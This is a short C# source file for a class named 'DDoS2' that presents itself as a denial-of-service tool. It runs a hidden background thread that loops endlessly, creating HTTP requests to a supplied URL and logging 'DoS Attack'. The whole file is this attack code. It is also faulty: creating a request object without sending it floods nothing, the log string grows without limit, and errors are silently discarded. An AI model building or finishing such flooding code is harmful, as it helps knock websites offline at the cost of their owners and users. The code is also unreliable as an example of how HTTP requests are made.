using System;
using System.Threading;
using System.Net;


/*
 *Lower link is aboute Thread and IsBackground
 * link: https://msdn.microsoft.com/en-us/library/system.threading.thread.isbackground(v=vs.110).aspx
 */
namespace PM4P
{
    class DDoS2
    {
        private string dt;
        private string urllink;

        public void getparam(string datatext, string url)
        {
            dt = datatext;
            urllink = url;
        }

        public string runfunction()
        {
            Thread obj1 = new Thread(threadattack);
            obj1.IsBackground = true;
            obj1.Start();
            return dt;
        }

        private void threadattack(Object obj)
        {
            try
            {
                attack(dt, urllink);
            }
            catch
            {
                
            }
        }
        
        private string attack(string datatext, string url)
        {
            for (; ; )
            {
                dt += "DoS Attack";
                //Thread.Sleep(4000);
                while (true)
                {
                    try
                    {
                        //tworzenie zapytania dla podanego url w metodzie Create
                        HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
                        dt += url;
                    }
                    catch (Exception ex)
                    {
                        dt += ex.Message;
                        break;
                    }
                }
            }
        }
    }
}
